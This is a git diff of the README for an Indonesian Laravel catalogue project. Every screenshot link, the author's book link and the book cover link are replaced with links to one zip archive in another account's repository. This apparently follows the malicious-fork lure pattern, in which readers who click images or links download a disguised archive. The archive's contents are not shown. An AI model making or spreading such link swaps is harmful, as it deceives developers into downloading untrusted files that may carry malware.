@@ -11,25 +11,25 @@
 Enjoy!
 
 ## Screenshot
-![Halaman Katalog](https://github.com/rahmatawaludin/approcket-preproject/raw/master/screenshot/1.png)
+![Halaman Katalog](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
 
-![Konfirmasi Delete](https://github.com/rahmatawaludin/approcket-preproject/raw/master/screenshot/2.png)
+![Konfirmasi Delete](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
 
-![Homepage](https://github.com/rahmatawaludin/approcket-preproject/raw/master/screenshot/3.png)
+![Homepage](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
 
-![CRUD Kategori](https://github.com/rahmatawaludin/approcket-preproject/raw/master/screenshot/4.png)
+![CRUD Kategori](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
 
-![CRUD Produk](https://github.com/rahmatawaludin/approcket-preproject/raw/master/screenshot/5.png)
+![CRUD Produk](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
 
-![Edit Produk](https://github.com/rahmatawaludin/approcket-preproject/raw/master/screenshot/6.png)
+![Edit Produk](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
 
-![Pagination + Search](https://github.com/rahmatawaludin/approcket-preproject/raw/master/screenshot/7.png)
+![Pagination + Search](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
 
-![Nested Relationship](https://github.com/rahmatawaludin/approcket-preproject/raw/master/screenshot/8.png)
+![Nested Relationship](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
 
 ## Want to learn more? 
-Baca buku saya [Menyelami Framework Laravel](https://leanpub.com/bukularavel)
+Baca buku saya [Menyelami Framework Laravel](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
 
-[![Menyelami Framework Laravel](https://s3.amazonaws.com/titlepages.leanpub.com/bukularavel/hero?1452331017)](https://leanpub.com/bukularavel)
+[![Menyelami Framework Laravel](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
 
 Berisi 745+ halaman panduan aplikatif untuk membangun aplikasi dengan framework Laravel 5.2.
